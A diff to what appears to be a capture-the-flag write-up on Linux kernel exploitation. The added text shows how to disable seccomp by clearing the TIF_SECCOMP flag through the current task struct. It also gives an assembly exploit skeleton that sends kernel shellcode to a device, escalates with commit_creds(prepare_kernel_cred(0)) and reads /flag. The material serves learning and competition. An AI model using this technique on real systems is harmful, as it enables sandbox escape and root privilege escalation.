@@ -76,4 +76,44 @@ To do this, dive into the creds struct which is used for privileges before and c
 
 <img width="375" height="90" alt="image" src="https://github.com/user-attachments/assets/b8a43785-a0ba-4b79-8b79-45035c6c2e2c" />
 
-In short, to disable the seccomp
+In short, to disable the seccomp, try do this in kernel space:
+
+```current->thread_info.flags &= ~(1 << TIF_SECCOMP)```
+
+where current is a macro to get the current task struct, but this involves another question: how to get that current in assembly?(Since the input is shellcode through the userland binary)
+
+The answer is that this could be obtained by searching Linux source tree for places that references macro current and check corresponding assembly, for example one such place is commit_creds:
+
+<img width="652" height="94" alt="image" src="https://github.com/user-attachments/assets/f8e04cb0-d75c-4c9f-aeec-dbbbdd4d85af" />
+<img width="740" height="124" alt="image" src="https://github.com/user-attachments/assets/15074bdf-560e-41d0-a8a8-f24797c7d1bd" />
+
+Then we know that gs:15d00 is the address for current task struct, given that thread_info is its first member, at the same time flags is the first member of thread_info which is of 8 bytes, then the assembly that disables seccomp flag is as follows:
+
+```
+mov    rax, qword [gs:0x15d00];
+and    qword [rax], 0xfffffffffffffeff;
+```
+Overall the exploit is in following shape:
+
+```
+_start:
+  ...
+  mov edi, 3
+  lea rsi, [rel kernel_shellcode]  ; pointer to kernel shellcode
+  mov edx, kernel_shellcode_len    ; length of kernel shellcode
+  syscall                          ; write kernel shellcode to device
+
+user_exp:
+  ...                              ; exploit after kernel shellcode such as orw
+  ...                              ; use flag_path flag_buf for data storage
+
+kernel_shellcode:
+  mov    rax, qword [gs:0x15d00];
+  and    qword [rax], 0xfffffffffffffeff;
+  ...                              ; perform commit_creds(prepare_kernel_cred(0))
+  ret
+
+flag_path: db "/flag", 0
+flag_buf: times 256 db 0
+kernel_shellcode_len equ $ - kernel_shellcode
+```
